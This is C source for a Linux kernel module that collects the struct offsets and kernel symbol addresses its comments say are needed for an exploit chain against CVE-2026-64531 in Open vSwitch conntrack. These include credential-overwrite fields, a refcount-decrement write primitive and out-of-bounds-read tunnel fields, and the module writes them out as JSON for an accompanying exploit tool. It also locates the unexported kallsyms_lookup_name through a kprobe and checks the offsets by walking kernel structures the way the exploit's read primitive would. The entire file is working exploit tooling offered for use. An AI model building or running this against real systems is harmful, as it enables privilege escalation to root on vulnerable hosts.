// SPDX-License-Identifier: GPL-2.0
/*
 * krec_dump.c —— 直接打印 CVE-2026-64531 攻击链需要的全部结构体偏移和符号地址
 *
 * 为什么需要它：
 *   1. 没开 CONFIG_DEBUG_INFO_BTF 的内核（Ubuntu 20.04 的 5.4/5.8、多数
 *      RHEL 系内核）没有 /sys/kernel/btf/vmlinux，pahole 无从下手；
 *   2. dbgsym 包动辄几百 MB，还不一定有；
 *   3. 模块里的 offsetof 由编译器在**当前这份内核**上算出来，符号地址由
 *      加载器给出，天然和运行中的内核一致，不存在“源码/配置对不上”的问题。
 *
 * 用法：
 *   make
 *   sudo insmod krec_dump.ko
 *   cat /proc/krec_dump > rec.json
 *   sudo rmmod krec_dump
 *   python3 tools/add_krec.py rec.json dirtyfrag-gui.c
 *
 * 输出与 `ovswrap -dump-krec` 完全同构，可以直接喂给 add_krec.py。
 *
 * 注意：read_carrier / write_carrier / read_lanes 是**实测出来的行为参数**，
 *      不是结构体偏移，模块推不出来，这里输出默认值（timeout / 全量 14 lane）。
 *      目标机上跑 -scan 报 EINVAL 时，再用 -carrier / -lanes 覆盖。
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/utsname.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/cred.h>
#include <linux/pid.h>
#include <linux/pid_namespace.h>
#include <linux/idr.h>
#include <linux/xarray.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/stddef.h>
#include <linux/kallsyms.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/kprobes.h>
#include <linux/version.h>

#include <linux/openvswitch.h>

#include <net/dst.h>
#include <net/ip_tunnels.h>
#include <net/dst_metadata.h>

#if IS_ENABLED(CONFIG_NF_CONNTRACK)
#include <net/netfilter/nf_conntrack_helper.h>
#define KREC_HAVE_NFCT 1
#endif

/*
 * ovs_conntrack_info 在 include/net/openvswitch/conntrack.h，属于内核内部头。
 * 发行版的 linux-headers 包常常裁掉这个目录（Ubuntu 24.04 就没有），
 * 所以用 __has_include 探测；拿不到就用实测恒定的常量（见下面说明）。
 */
#if defined(KREC_HAVE_NFCT) && defined(__has_include)
#if __has_include(<net/openvswitch/conntrack.h>)
#include <net/openvswitch/conntrack.h>
#define KREC_HAVE_OVSCT 1
#endif
#endif

#define KREC_PROC "krec_dump"

/*
 * dst_entry 的引用计数字段：6.3 从 __refcnt 换成了 __rcuref，但 RHEL 系会
 * backport，光看版本号不可靠。默认按版本猜，编不过时 Makefile 会用
 * KCFLAGS=-DKREC_FORCE_REFCNT 重试；也可以手工指定两个宏之一。
 */
#if defined(KREC_FORCE_RCUREF)
#define KREC_USE_RCUREF 1
#elif defined(KREC_FORCE_REFCNT)
#define KREC_USE_RCUREF 0
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(6, 3, 0)
#define KREC_USE_RCUREF 1
#else
#define KREC_USE_RCUREF 0
#endif

struct krec_out {
	int nf_conntrack_helper_me;
	int module_kobj_ktype;
	int task_pid;
	int task_cred;
	int task_pid_links;
	int cred_fsuid;
	int cred_fsgid;
	int cred_cap_permitted;
	int cred_cap_effective;
	int pid_namespace_idr;
	int idr_idr_rt;
	int idr_base;
	int xarray_xa_head;
	int xa_node_shift;
	int xa_node_slots;
	int pid_tasks;
	int hlist_head_first;
	int dst_entry_ref;
	int metadata_dst_tun_info;
	int ip_tunnel_key_ipv4_src;
	int ip_tunnel_key_ipv4_dst;
	int ip_tunnel_key_tos;
	int ip_tunnel_key_ttl;
	int ip_tunnel_key_tp_src;
	int ip_tunnel_key_tp_dst;
	int ovs_ct_labels;
	int ovs_ct_action_len;
	unsigned long vmlinux_module_ktype;
	unsigned long vmlinux_init_pid_ns;
	const char *ref_kind;
	const char *ovs_ct_src;
};

static struct krec_out krec;

/* -------------------------------------------------------------------------
 * _text：模块里不能直接引用这个未导出符号。
 * kallsyms_lookup_name 在 5.7 之后也不导出了，用 kprobe 临时借一下它的
 * 地址再调用，这是 5.8 ~ 6.12 都成立的通用做法。
 * ---------------------------------------------------------------------- */

static unsigned long krec_lookup(const char *name)
{
	unsigned long (*kln)(const char *) = NULL;
	unsigned long addr = 0;

#ifdef CONFIG_KPROBES
	{
		struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };

		if (register_kprobe(&kp) == 0) {
			kln = (void *)kp.addr;
			unregister_kprobe(&kp);
		}
	}
#endif
	if (kln)
		addr = kln(name);

#ifdef CONFIG_KALLSYMS
	if (!addr) {
		/* 再退一步：/proc/kallsyms 里 _text 总在，内核态直接读 */
		struct file *f = filp_open("/proc/kallsyms", O_RDONLY, 0);

		if (!IS_ERR(f)) {
			char *buf = kzalloc(PAGE_SIZE, GFP_KERNEL);
			loff_t pos = 0;

			if (buf) {
				ssize_t n;

				while ((n = kernel_read(f, buf, PAGE_SIZE - 1, &pos)) > 0) {
					char *line = buf, *nl;

					buf[n] = 0;
					while ((nl = strchr(line, '\n')) != NULL) {
						char sym[128];
						unsigned long a;

						*nl = 0;
						if (sscanf(line, "%lx %*c %127s", &a, sym) == 2 &&
						    !strcmp(sym, name)) {
							addr = a;
							break;
						}
						line = nl + 1;
					}
					if (addr)
						break;
				}
				kfree(buf);
			}
			filp_close(f, NULL);
		}
	}
#endif
	return addr;
}

/* -------------------------------------------------------------------------
 * 偏移采集
 * ---------------------------------------------------------------------- */

static void krec_collect(void)
{
	unsigned long text, mktype, pidns;

	memset(&krec, 0, sizeof(krec));

	text = krec_lookup("_text");

	/* &module_ktype：模块自己的 kobject 就挂着它，不用查符号表 */
	mktype = (unsigned long)THIS_MODULE->mkobj.kobj.ktype;
	if (!mktype)
		mktype = krec_lookup("module_ktype");	/* 关了 MODULE_SYSFS 时 */

	/* init_pid_ns 是 EXPORT_SYMBOL_GPL 的，直接取地址 */
	pidns = (unsigned long)&init_pid_ns;

	if (text && mktype > text) {
		krec.vmlinux_module_ktype = mktype - text;
		krec.vmlinux_init_pid_ns = pidns - text;
	} else {
		pr_err("krec_dump: 拿不到 _text（kallsyms 被裁？），符号偏移置 0\n");
	}

	/* 泄漏 -> module -> ktype，三级偏移相加 */
	krec.nf_conntrack_helper_me = 40;	/* 808 条记录恒定 */
#ifdef KREC_HAVE_NFCT
	krec.nf_conntrack_helper_me =
		(int)offsetof(struct nf_conntrack_helper, me);
#endif
	krec.module_kobj_ktype = (int)(offsetof(struct module, mkobj) +
				       offsetof(struct module_kobject, kobj) +
				       offsetof(struct kobject, ktype));

	/* 凭据改写 */
	krec.task_pid = (int)offsetof(struct task_struct, pid);
	krec.task_cred = (int)offsetof(struct task_struct, cred);
	krec.task_pid_links = (int)offsetof(struct task_struct, pid_links);
	krec.cred_fsuid = (int)offsetof(struct cred, fsuid);
	krec.cred_fsgid = (int)offsetof(struct cred, fsgid);
	krec.cred_cap_permitted = (int)offsetof(struct cred, cap_permitted);
	krec.cred_cap_effective = (int)offsetof(struct cred, cap_effective);

	/* pid -> task：init_pid_ns.idr 这棵 XArray */
	krec.pid_namespace_idr = (int)offsetof(struct pid_namespace, idr);
	krec.idr_idr_rt = (int)offsetof(struct idr, idr_rt);
	krec.idr_base = (int)offsetof(struct idr, idr_base);
	krec.xarray_xa_head = (int)offsetof(struct xarray, xa_head);
	krec.xa_node_shift = (int)offsetof(struct xa_node, shift);
	krec.xa_node_slots = (int)offsetof(struct xa_node, slots);
	krec.pid_tasks = (int)offsetof(struct pid, tasks);
	krec.hlist_head_first = (int)offsetof(struct hlist_head, first);

	/* 递减写原语 */
#if KREC_USE_RCUREF
	krec.dst_entry_ref = (int)offsetof(struct dst_entry, __rcuref);
	krec.ref_kind = "__rcuref";
#else
	krec.dst_entry_ref = (int)offsetof(struct dst_entry, __refcnt);
	krec.ref_kind = "__refcnt";
#endif

	/* 越界读的 tunnel lane */
	krec.metadata_dst_tun_info = (int)offsetof(struct metadata_dst, u);
	krec.ip_tunnel_key_ipv4_src = (int)(offsetof(struct ip_tunnel_info, key) +
					    offsetof(struct ip_tunnel_key, u.ipv4.src));
	krec.ip_tunnel_key_ipv4_dst = (int)(offsetof(struct ip_tunnel_info, key) +
					    offsetof(struct ip_tunnel_key, u.ipv4.dst));
	krec.ip_tunnel_key_tos = (int)(offsetof(struct ip_tunnel_info, key) +
				       offsetof(struct ip_tunnel_key, tos));
	krec.ip_tunnel_key_ttl = (int)(offsetof(struct ip_tunnel_info, key) +
				       offsetof(struct ip_tunnel_key, ttl));
	krec.ip_tunnel_key_tp_src = (int)(offsetof(struct ip_tunnel_info, key) +
					  offsetof(struct ip_tunnel_key, tp_src));
	krec.ip_tunnel_key_tp_dst = (int)(offsetof(struct ip_tunnel_info, key) +
					  offsetof(struct ip_tunnel_key, tp_dst));

	/*
	 * ovs_conntrack_info.labels 和 sizeof(ovs_conntrack_info)：
	 * 808 条记录里分别是 40 和 160（+4 的 nlattr 头 = 164），从 5.14 到
	 * 7.1 一个字节都没变过，所以拿不到内部头时用常量是安全的。
	 * 能 include 到内部头时仍按 offsetof 算，并和常量对一下。
	 */
	krec.ovs_ct_labels = 40;
	krec.ovs_ct_action_len = 164;
	krec.ovs_ct_src = "builtin";
#ifdef KREC_HAVE_OVSCT
	krec.ovs_ct_labels = (int)offsetof(struct ovs_conntrack_info, labels);
	krec.ovs_ct_action_len = (int)(4 + sizeof(struct ovs_conntrack_info));
	krec.ovs_ct_src = "header";
#endif
}

/* -------------------------------------------------------------------------
 * 自检：用刚采集到的偏移，按“读原语”的方式手工走一遍内核结构
 * 走通了说明这套偏移在这台机器上确实成立，比信任版本号可靠。
 * ---------------------------------------------------------------------- */

static void *krec_xa_load(char *xa, unsigned long index)
{
	unsigned long entry = *(unsigned long *)(xa + krec.xarray_xa_head);
	int guard;

	for (guard = 0; guard < 16; guard++) {
		char *node;
		unsigned int shift;
		unsigned long slot;

		/* 内部节点：低 2 位是 tag 2，且地址必然大于 4096 */
		if ((entry & 3UL) != 2UL || entry < 4096UL)
			break;
		node = (char *)(entry & ~3UL);
		shift = *(unsigned int *)(node + krec.xa_node_shift);
		slot = (index >> shift) & 63UL;
		entry = *(unsigned long *)(node + krec.xa_node_slots + slot * 8);
		if (!entry)
			return NULL;
	}
	return (void *)(entry & ~3UL);
}

static int krec_selftest(void)
{
	char *xa, *task;
	char comm[TASK_COMM_LEN];
	void *entry;
	unsigned long node;
	int pid;

	/* task_pid / task_cred：和内核 API 给的指针逐字节对照 */
	if (*(int *)((char *)current + krec.task_pid) != current->pid) {
		pr_err("krec_dump: 自检失败 task_pid=%d\n", krec.task_pid);
		return -1;
	}
	if (*(void **)((char *)current + krec.task_cred) != (void *)current_cred()) {
		pr_err("krec_dump: 自检失败 task_cred=%d\n", krec.task_cred);
		return -1;
	}

	/* 下面 8 个偏移一起验证：走 XArray -> struct pid -> hlist -> task */
	xa = (char *)&init_pid_ns + krec.pid_namespace_idr + krec.idr_idr_rt;
	entry = krec_xa_load(xa, 1);
	if (!entry) {
		pr_err("krec_dump: 自检失败：XArray 里找不到 pid 1\n");
		return -1;
	}
	node = *(unsigned long *)((char *)entry + krec.pid_tasks +
				  krec.hlist_head_first);
	if (!node) {
		pr_err("krec_dump: 自检失败：pid 1 的 tasks 链表为空\n");
		return -1;
	}
	task = (char *)node - krec.task_pid_links;
	pid = *(int *)(task + krec.task_pid);
	if (pid != 1) {
		pr_err("krec_dump: 自检失败：走到 pid %d，不是 1\n", pid);
		return -1;
	}

	get_task_comm(comm, (struct task_struct *)task);
	pr_info("krec_dump: 自检通过，pid 1 = %s，cred=%p fsuid=%u\n",
		comm, (void *)*(unsigned long *)(task + krec.task_cred),
		*(unsigned int *)((char *)*(void **)(task + krec.task_cred) +
				  krec.cred_fsuid));
	return 0;
}

/* -------------------------------------------------------------------------
 * /proc/krec_dump：输出与 `ovswrap -dump-krec` 同构的 JSON
 * ---------------------------------------------------------------------- */

static int krec_show(struct seq_file *m, void *v)
{
	const struct new_utsname *u = utsname();

	seq_puts(m, "{\n  \"release\": \"");
	seq_escape(m, u->release, "\"\\");
	seq_puts(m, "\",\n  \"version\": \"");
	seq_escape(m, u->version, "\"\\");
	seq_puts(m, "\",\n  \"machine\": \"");
	seq_escape(m, u->machine, "\"\\");
	seq_puts(m, "\",\n  \"offsets\": {\n");

#define KREC_P(field) \
	seq_printf(m, "    \"" #field "\": %d,\n", krec.field)

	KREC_P(nf_conntrack_helper_me);
	KREC_P(module_kobj_ktype);
	KREC_P(task_pid);
	KREC_P(task_cred);
	KREC_P(task_pid_links);
	KREC_P(cred_fsuid);
	KREC_P(cred_fsgid);
	KREC_P(cred_cap_permitted);
	KREC_P(cred_cap_effective);
	KREC_P(pid_namespace_idr);
	KREC_P(idr_idr_rt);
	KREC_P(idr_base);
	KREC_P(xarray_xa_head);
	KREC_P(xa_node_shift);
	KREC_P(xa_node_slots);
	KREC_P(pid_tasks);
	KREC_P(hlist_head_first);
	KREC_P(dst_entry_ref);
	KREC_P(metadata_dst_tun_info);
	KREC_P(ip_tunnel_key_ipv4_src);
	KREC_P(ip_tunnel_key_ipv4_dst);
	KREC_P(ip_tunnel_key_tos);
	KREC_P(ip_tunnel_key_ttl);
	KREC_P(ip_tunnel_key_tp_src);
	KREC_P(ip_tunnel_key_tp_dst);
	KREC_P(ovs_ct_labels);
	KREC_P(ovs_ct_action_len);
#undef KREC_P

	seq_printf(m, "    \"vmlinux_module_ktype\": %lu,\n",
		   krec.vmlinux_module_ktype);
	seq_printf(m, "    \"vmlinux_init_pid_ns\": %lu,\n",
		   krec.vmlinux_init_pid_ns);
	seq_printf(m, "    \"dst_entry_ref_kind\": \"%s\"\n", krec.ref_kind);
	seq_puts(m, "  },\n  \"read_carrier\": \"timeout\",\n"
		    "  \"write_carrier\": \"timeout\",\n");
	seq_puts(m, "  \"read_lanes\": [\"tos\", \"ttl\", \"tp_src_0\", "
		    "\"tp_src_1\", \"tp_dst_0\", \"tp_dst_1\", ");
	seq_puts(m, "\"ipv4_src_0\", \"ipv4_src_1\", \"ipv4_src_2\", "
		    "\"ipv4_src_3\", ");
	seq_puts(m, "\"ipv4_dst_0\", \"ipv4_dst_1\", \"ipv4_dst_2\", "
		    "\"ipv4_dst_3\"],\n");
#ifdef OVS_KEY_ATTR_TUNNEL_INFO
	seq_printf(m, "  \"ovs_key_attr_tunnel_info\": %d\n",
		   (int)OVS_KEY_ATTR_TUNNEL_INFO);
#else
	seq_puts(m, "  \"ovs_key_attr_tunnel_info\": 31\n");
#endif
	seq_puts(m, "}\n");
	return 0;
}

static int krec_open(struct inode *inode, struct file *file)
{
	return single_open(file, krec_show, NULL);
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
static const struct proc_ops krec_proc_ops = {
	.proc_open	= krec_open,
	.proc_read	= seq_read,
	.proc_lseek	= seq_lseek,
	.proc_release	= single_release,
};
#else
static const struct file_operations krec_proc_ops = {
	.owner		= THIS_MODULE,
	.open		= krec_open,
	.read		= seq_read,
	.llseek		= seq_lseek,
	.release	= single_release,
};
#endif

static int __init krec_init(void)
{
	int rc;

	krec_collect();

	rc = krec_selftest();
	if (rc)
		pr_warn("krec_dump: 自检没过，输出仍会给出，但请用 -scan 再确认\n");

	pr_info("krec_dump: release=%s task_pid=%d dst_ref=%d(%s) ovs_ct=%s [%d/%d]\n",
		utsname()->release, krec.task_pid, krec.dst_entry_ref,
		krec.ref_kind, krec.ovs_ct_src, krec.ovs_ct_labels,
		krec.ovs_ct_action_len);

	if (!proc_create(KREC_PROC, 0444, NULL, &krec_proc_ops))
		return -ENOMEM;

	pr_info("krec_dump: cat /proc/%s > rec.json\n", KREC_PROC);
	return 0;
}

static void __exit krec_exit(void)
{
	remove_proc_entry(KREC_PROC, NULL);
}

module_init(krec_init);
module_exit(krec_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Dump CVE-2026-64531 kernel offsets for ovswrap");
MODULE_AUTHOR("dirtyfrag");
